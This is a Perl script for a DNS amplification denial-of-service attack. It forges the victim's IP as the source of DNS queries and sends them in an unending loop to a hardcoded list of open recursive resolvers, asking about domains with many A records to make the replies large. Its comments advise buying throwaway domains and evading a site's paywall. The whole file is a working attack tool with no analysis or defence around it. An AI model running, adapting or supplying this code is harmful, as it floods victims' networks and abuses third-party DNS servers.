#!/usr/bin/perl
use Net::DNS::Resolver;
use Net::RawIP;
use strict;

# Populate this list with domain names with lots of A records. IRC server DNS pools are a good place to look.
# Maybe get a cheap throwaway domain and add your own A records.
my @name = ("ilineage2.ru","amp.crack-zone.ru","ghmn.ru","grungyman.cloudns.org", "erhj.pw", "datburger.cloudns.org", "adrenalinessss.cc", "Zong.Zong.Co.Ua", "qww1.ru", "pddos.com", "iri.so", "saveroads.ru");
my $names = "11"; #number of entries in @name, minus one.

# Populate this list with ONLY open, recursive dns servers.
# http://www.dnsstuff.com/ - Block their cookies to use the site w/o paying.
my $nameservers;
my @nameservers = ("205.234.223.168", "64.202.117.121", "208.80.184.69", "200.255.59.150",
                   "38.99.131.12", "207.41.41.248", "69.225.174.141", "68.87.96.3",
                   "68.87.96.4", "195.122.131.250", "80.237.244.50", "38.99.77.80",
                   "69.93.224.2", "38.99.76.229", "38.99.76.3", "38.99.76.2",
                   "216.55.155.41", "216.55.155.33", "208.48.232.157", "64.124.191.6",
                   "143.166.82.251", "143.166.82.252", "143.166.224.3", "143.166.224.11",
                   "143.166.83.13", "209.78.77.2", "8.4.80.15", "216.213.88.50",
                   "64.7.203.250", "66.165.186.15", "64.7.203.251", "66.165.186.16",
                   "209.162.192.4", "209.200.46.12", "69.42.71.212", "209.200.46.12",
                   "69.42.71.212", "212.112.231.183", "212.124.35.14", "207.254.41.30",
                   "204.141.20.253", "204.141.20.193", "195.92.253.2", "209.132.176.167",
                   "66.55.68.10", "66.55.68.11", "66.175.230.5", "66.175.230.10",
                   "74.84.206.221", "74.84.206.132", "64.58.142.2", "64.58.142.3"); #52 entries.

my $reflectors = "51"; # Number of entries in @nameservers, minus one.
my $debug = 1; # Change to 0 if you don't wanna have your console flooded.

##########################
# END USER CONFIGURATION #
##########################
my $str;
my $name;
my $src_ip;
my $reflector;
$src_ip = $ARGV[0];

if ($ARGV[0] eq '') { print "Usage: " . $0 . " <IP>\n"; exit(0); }
print ("Hitting $ARGV[0]\n");

for (my $i=0; $i < 256; $i++) {
    # Make DNS packet
    my $dnspacket = new Net::DNS::Packet($str, "A", "IN");
    my $dnsdata = $dnspacket->data;
    my $sock = new Net::RawIP({udp=>{}});
    # send packet
    $str = @name[int rand($names)];                            # Select entry from @name
    $reflector = $nameservers[int rand($reflectors)];          # Select entry from @nameservers
    $sock->set({ip => {
                saddr => $src_ip, daddr => "$reflector", frag_off=>0,tos=>0,id=>1565},
                udp => {source => 53,
                dest => 53, data=>$dnsdata
                } });
    $sock->send;
    if ($debug eq "1") { print "Me -> " . $reflector . "(DNSing " . $str . ")" . " -> " . $src_ip . " \n"; }
    $i = 0;
}
exit(0);
